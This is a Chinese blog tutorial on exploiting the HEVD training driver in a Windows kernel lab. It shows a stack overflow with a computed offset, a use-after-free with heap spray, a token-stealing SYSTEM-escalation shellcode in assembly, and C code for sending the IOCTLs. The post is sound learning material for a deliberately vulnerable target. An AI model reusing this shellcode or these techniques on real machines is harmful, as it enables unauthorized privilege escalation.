<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210172145465.png" alt="image-20220210172145465"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210171445392.png" alt="image-20220210171445392"></p>
<p>注册服务并启动服务</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210171721236.png" alt="image-20220210171721236"></p>
<p>在调试机win10上：</p>
<p>打开windbg，运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lm m H*</span><br><span class="line">lmDvmHEVD</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216104616725.png" alt="image-20220216104616725"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216104637185.png" alt="image-20220216104637185"></p>
<p>点击browse all global symbols，看到如下情况就是成功了。</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216104653505.png" alt="image-20220216104653505"></p>
<h4 id="0x1-栈溢出"><a href="#0x1-栈溢出" class="headerlink" title="0x1 栈溢出"></a>0x1 栈溢出</h4><h5 id="0x11-原理"><a href="#0x11-原理" class="headerlink" title="0x11 原理"></a>0x11 原理</h5><p>栈是一种数据结构，先进后出，用来保存函数的返回地址，参数，局部变量等数据。</p>
<p>栈溢出大概是最基础的漏洞，我的理解是程序没有对向栈中某变量写入数据的大小进行合理的控制，我们就可以构造一些数据（shellcode）来覆盖栈中其他相邻变量的值比如返回地址，从而让程序运行我们的代码。</p>
<h5 id="0x12-实践"><a href="#0x12-实践" class="headerlink" title="0x12 实践"></a>0x12 实践</h5><p>思路：</p>
<ol>
<li>寻找能够程序中提供写入数据的点</li>
<li>找偏移，覆盖</li>
<li>写shellcode</li>
</ol>
<h6 id="寻找程序中提供输入的地方"><a href="#寻找程序中提供输入的地方" class="headerlink" title="寻找程序中提供输入的地方"></a>寻找程序中提供输入的地方</h6><p>用ida查看HEVD.sys</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216110457268.png" alt="image-20220216110457268"></p>
<p>程序在使用memcpy时，并没有对KernelBuffer输入大小进行判断和控制，就可能会出现栈溢出</p>
<h6 id="找偏移，正确覆盖"><a href="#找偏移，正确覆盖" class="headerlink" title="找偏移，正确覆盖"></a>找偏移，正确覆盖</h6><p>在ida中修改base，修改为windbg中看到的HEVD的地址</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216142639319.png" alt="image-20220216142639319"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216111959313.png" alt="image-20220216111959313"></p>
<p>得到函数开始和memcpy函数开始的地址：928851A2和92885235</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216142815671.png" alt="image-20220216142815671"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216142826873.png" alt="image-20220216142826873"></p>
<p>同时buffer的大小是0x800</p>
<p>在windbg中下断点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bu 928851A2</span><br><span class="line">bu 92885235</span><br></pre></td></tr></table></figure>

<p>然后运行，在被调试机上运行exp</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216143422234.png" alt="image-20220216143422234"></p>
<p>记录a8b88ab4</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216143503302.png" alt="image-20220216143503302"></p>
<p>记录buffer开始位置a8b88294</p>
<p>偏移为：a8b88ab4-a8b88294=0x820</p>
<p>运行官方exp：</p>
<p>buffer的大小是0x800，查看a8b88294（buffer开始位置）+0x7f0（第一行即为buffer最后一行）处的堆栈</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155549364.png" alt="image-20220216155549364"></p>
<p>单步，可以看到堆栈被A填充满了</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155834943.png" alt="image-20220216155834943"></p>
<p>ebp也被41覆盖了，返回地址00063710是shellcoded的地址</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155937626.png" alt="image-20220216155937626"></p>
<p>官方exp运行结果：</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155339673.png" alt="image-20220216155339673"></p>
<h6 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h6><p>首先需要知道如何和驱动通信：</p>
<p>用户通过I/O请求包IRP-》句柄引用文件对象-》设备对象-》驱动程序对象(ring0)</p>
<p>即通过文件对象定位到关联的设备对象，然后定位到驱动程序对象，I/O管理器将I/O请求传递给驱动程序的例程。</p>
<p>因此编写思路：</p>
<p>1、通过CreateFile函数创建一个指向xx设备对象的文件对象</p>
<p>2、调用DeviceIoControl函数对设备对象发出I/O请求，请求中包含提权的shellcode</p>
<p>3、使用CloseHandle函数关闭文件对象</p>
<p>框架：shellcode+buf+通信</p>
<p><strong>提权的shellcode</strong>（官方）：</p>
<p>原理：通过遍历进程找到system进程【pid=4】，复制它的token给当前线程即可提权，可以修改cmd token的值为system token即可提权</p>
<pre><code> __asm &#123;
        pushad                               ; Save registers state
    ; Start of Token Stealing Stub
    xor eax, eax                         ; Set ZERO
    mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                         ; _KTHREAD is located at FS:[0x124]

    mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

    mov ecx, eax                         ; Copy current process _EPROCESS structure

    mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

    SearchSystemPID:
        mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
        sub eax, FLINK_OFFSET
        cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
        jne SearchSystemPID

    mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
    mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                         ; with SYSTEM process nt!_EPROCESS.Token
    ; End of Token Stealing Stub

    popad                                ; Restore registers state

    ; Kernel Recovery Stub
    xor eax, eax                         ; Set NTSTATUS SUCCEESS
    add esp, 12                          ; Fix the stack
    pop ebp                              ; Restore saved EBP
    ret 8                                ; Return cleanly
&#125;</code></pre>
<p><strong>创建文件对象</strong></p>
<p>CreateFileA函数：如果函数成功，则返回值是指定文件、设备、命名管道或邮槽的打开句柄。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateFileA(</span><br><span class="line">  [in]           LPCSTR                lpFileName,</span><br><span class="line">  [in]           DWORD                 dwDesiredAccess,</span><br><span class="line">  [in]           DWORD                 dwShareMode,</span><br><span class="line">  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span><br><span class="line">  [in]           DWORD                 dwCreationDisposition,</span><br><span class="line">  [in]           DWORD                 dwFlagsAndAttributes,</span><br><span class="line">  [in, optional] HANDLE                hTemplateFile</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在源码中我们可以找到设备名称：HackSysExtremeVulnerableDriver，格式为\.\设备名称</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220211155004457.png" alt="image-20220211155004457"></p>
<p>因此设备名称：\.\HackSysExtremeVulnerableDriver</p>
<p>同时在使用CreateFileA函数时，需要指定FILE_SHARE_READ和 FILE_SHARE_WRITE访问标志，fdwCreate<em>参数</em>必须指定 OPEN_EXISTING，hTemplateFile参数必须为NULL，fdwAttrsAndFlags<em>参数</em>可以指定 FILE_FLAG_OVERLAPPED来指示返回的句柄可以用于重叠（异步）I/O 操作。</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hFile &#x3D; CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;,</span><br><span class="line">                        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">                        NULL,</span><br><span class="line">                        OPEN_EXISTING,</span><br><span class="line">                        FILE_FLAG_OVERLAPPED,</span><br><span class="line">                        NULL);</span><br></pre></td></tr></table></figure>

<p><strong>定义buffer</strong></p>
<p>我们要将返回地址覆盖为shellcode的位置，因此buffer大小为(0x820[覆盖到ebp]+0x4[返回地址])，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buf[0x824];#申请一个0x824大小的字符数组</span><br><span class="line">memset(buf, &#39;A&#39;, 0x824);#全赋A</span><br><span class="line">*(PDWORD)(buf + 0x820) &#x3D; (DWORD)&amp;ShellCode;#最后4位返回地址为shellcode的地址</span><br></pre></td></tr></table></figure>

<p><strong>发出I/O请求</strong></p>
<p>使用DeviceIoControl 函数（直接向指定的设备驱动程序发送控制代码，使相应的设备执行相应的操作）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL DeviceIoControl(</span><br><span class="line">  [in]                HANDLE       hDevice,	#要在其上执行操作的设备的句柄。设备通常是卷、目录、文件或流。要检索设备句柄，请使用CreateFile函数</span><br><span class="line">  [in]                DWORD        dwIoControlCode,#操作的控制代码</span><br><span class="line">  [in, optional]      LPVOID       lpInBuffer,#指向包含执行操作所需数据的输入缓冲区的指针</span><br><span class="line">  [in]                DWORD        nInBufferSize,#输入缓冲区的大小</span><br><span class="line">  [out, optional]     LPVOID       lpOutBuffer,#指向要接收操作返回的数据的输出缓冲区的指针</span><br><span class="line">  [in]                DWORD        nOutBufferSize,#输出缓冲区的大小</span><br><span class="line">  [out, optional]     LPDWORD      lpBytesReturned,#指向变量的指针，该变量接收存储在输出缓冲区中的数据大小</span><br><span class="line">  [in, out, optional] LPOVERLAPPED lpOverlapped#指向OVERLAPPED结构的指针</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>设置参数：</p>
<p>1、hDevice，设备的句柄，在createfile的时候返回了</p>
<p>2、dwIoControlCode，是由CTL_CODE宏定义的，用于创建一个唯一的32位系统I/O控制代码</p>
<p>到ida里寻找，使用0x222003（即IoControlCode）通信可以调用有栈溢出漏洞的函数</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217150346522.png" alt="image-20220217150346522"></p>
<p>3、lpInBuffer，我们定义的buf</p>
<p>4、nInBufferSize，buf的大小</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(hFile,dwIoControlCode,(LPVOID)buf,0x824,NULL,0,&amp;BytesReturned,NULL);</span><br></pre></td></tr></table></figure>

<p>最终main函数：</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217171459157.png" alt="image-20220217171459157"></p>
<p>执行情况：成功</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217171655895.png" alt="image-20220217171655895"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217171758159.png" alt="image-20220217171758159"></p>
<h5 id="0x13-出现的问题"><a href="#0x13-出现的问题" class="headerlink" title="0x13 出现的问题"></a>0x13 出现的问题</h5><p>1、windbg显示不了调试信息</p>
<p>解决：输入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed nt!Kd_DEFAULT_Mask 8</span><br></pre></td></tr></table></figure>

<h4 id="0x2-UAF"><a href="#0x2-UAF" class="headerlink" title="0x2 UAF"></a>0x2 UAF</h4><h5 id="0x21-原理"><a href="#0x21-原理" class="headerlink" title="0x21 原理"></a>0x21 原理</h5><p>申请的内存块被释放后，其对应的指针没有被设置为 NULL，下次申请内存的时候可能会再次使用该内存块，使用代码对这块内存进行修改，之前的内存指针就可以访问修改过的内存。程序再次使用这块内存时，就可能会出现问题。</p>
<h5 id="0x22-实践"><a href="#0x22-实践" class="headerlink" title="0x22 实践"></a>0x22 实践</h5><h6 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h6><p>g_UseAfterFreeObjectNonPagedPool在内存块释放了之后，指针没有置空，因此会成为悬空指针（dangling pointer）</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220218133405073.png" alt="image-20220218133405073"></p>
<p>查看g_UseAfterFreeObjectNonPagedPool的结构体PUSE_AFTER_FREE_NON_PAGED_POOL的定义</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224154105071.png" alt="image-20220224154105071"></p>
<p>有一个callback，在调用UseUaFObjectNonPagedPool时会调用</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224162837607.png" alt="image-20220224162837607"></p>
<p>因此存在uaf漏洞，我们需要将callback修改成我们的shellcode</p>
<h6 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h6><p>思路：</p>
<ol>
<li>申请内存</li>
<li>释放内存</li>
<li>申请一个内存，将callback指向我们的shellcode</li>
<li>调用UseUaFObjectNonPagedPool，shellcode就会执行</li>
</ol>
<p>查看dwIoControlCode：</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220218170603669.png" alt="image-20220218170603669"></p>
<p>编写exp：</p>
<p>1、申请和释放</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(hDevice, 0x222013, NULL, NULL, NULL, 0, &amp;rBuf, NULL);&#x2F;&#x2F;调用AllocateUaFObject()函数申请内存</span><br><span class="line">DeviceIoControl(hDevice, 0x22201B, NULL, NULL, NULL, 0, &amp;rBuf, NULL);&#x2F;&#x2F;调用FreeUaFObject()函数释放对象</span><br></pre></td></tr></table></figure>

<p>2、构造一个内存块，将callback指向我们的shellcode</p>
<p>参考common.h和UseAfterFreeNonPagedPool.h中的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef void (*FunctionPointer)(void);</span><br><span class="line">typedef struct _USE_AFTER_FREE_NON_PAGED_POOL</span><br><span class="line">&#123;</span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[0x54];</span><br><span class="line">&#125; USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSE_AFTER_FREE_NON_PAGED_POOL fake_UseAfterFree &#x3D; (PUSE_AFTER_FREE_NON_PAGED_POOL)malloc(sizeof(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">	fake_UseAfterFree-&gt;Callback &#x3D; ShellCode;</span><br><span class="line">	RtlFillMemory(fakeG_UseAfterFree-&gt;Buffer, sizeof(fake_UseAfterFree-&gt;Buffer), &#39;A&#39;);</span><br></pre></td></tr></table></figure>

<p>但是由于windows的内存管理在释放一块内存时可能会与相邻的内存块合并以便构成更大的空闲块，只申请一块假堆并不能保证刚好用的是之前释放的那块内存，所以需要申请多个假堆</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224163450742.png" alt="image-20220224163450742"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (int i &#x3D; 0; i &lt; 5000; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		DeviceIoControl(hDevice, 0x22201F, fake_UseAfterFree, 0x60, NULL, 0, &amp;recvBuf, NULL);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>最后调用UseUaFObjectNonPagedPool，此时的callback函数已经变成我们的shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(hDevice, 0x222017, NULL, NULL, NULL, 0, &amp;recvBuf, NULL);</span><br></pre></td></tr></table></figure>

<p>最终main函数：</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224164928968.png" alt="image-20220224164928968"></p>
<p>执行情况：</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220311151937772.png" alt="image-20220311151937772"></p>
<h5 id="0x23-出现的问题"><a href="#0x23-出现的问题" class="headerlink" title="0x23 出现的问题"></a>0x23 出现的问题</h5><p>1、使用官方的提权shellcode会出现蓝屏，不太理解</p>
<p>2、堆喷射偶尔会失败，即并未覆盖到正确的位置从而没能成功提权</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/windows-kernel-expolit/" rel="tag"><i class="fa fa-tag"></i> windows kernel expolit</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/12/09/%E7%A0%B4%E8%A7%A3%E6%9F%90%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E8%BD%AF%E4%BB%B6/" rel="prev" title="破解某思维导图软件">
      <i class="fa fa-chevron-left"></i> 破解某思维导图软件
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87"><span class="nav-text">从0开始学习windows内核漏洞-HEVD篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x0 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x01 双机调试环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="nav-text">所需工具：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-text">搭建过程：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="nav-text">出现的问题：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-HEVD%E6%90%AD%E5%BB%BA"><span class="nav-text">0x02 HEVD搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7%EF%BC%9A-1"><span class="nav-text">所需工具：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="nav-text">搭建过程：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-text">0x1 栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x11-%E5%8E%9F%E7%90%86"><span class="nav-text">0x11 原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x12-%E5%AE%9E%E8%B7%B5"><span class="nav-text">0x12 实践</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%8F%90%E4%BE%9B%E8%BE%93%E5%85%A5%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-text">寻找程序中提供输入的地方</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%89%BE%E5%81%8F%E7%A7%BB%EF%BC%8C%E6%AD%A3%E7%A1%AE%E8%A6%86%E7%9B%96"><span class="nav-text">找偏移，正确覆盖</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp"><span class="nav-text">编写exp</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x13-%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-text">0x13 出现的问题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-UAF"><span class="nav-text">0x2 UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x21-%E5%8E%9F%E7%90%86"><span class="nav-text">0x21 原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x22-%E5%AE%9E%E8%B7%B5"><span class="nav-text">0x22 实践</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%9A"><span class="nav-text">漏洞点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-text">利用：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x23-%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-text">0x23 出现的问题</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="0xkami"
      src="/images/head.png">
  <p class="site-author-name" itemprop="name">0xkami</p>
  <div class="site-description" itemprop="description">If you want me,satisfy me</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">40</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">40</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title">
      <i class="fa fa-fw fa-link"></i>
      友链
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://www.harvey-blog.com/" title="http:&#x2F;&#x2F;www.harvey-blog.com" rel="noopener" target="_blank">Harveysn0w·北极熊</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://l3t1tb3.xyz/" title="http:&#x2F;&#x2F;l3t1tb3.xyz&#x2F;" rel="noopener" target="_blank">l3t1tb3</a>
        </li>
        <li class="links-of-blogroll-item">
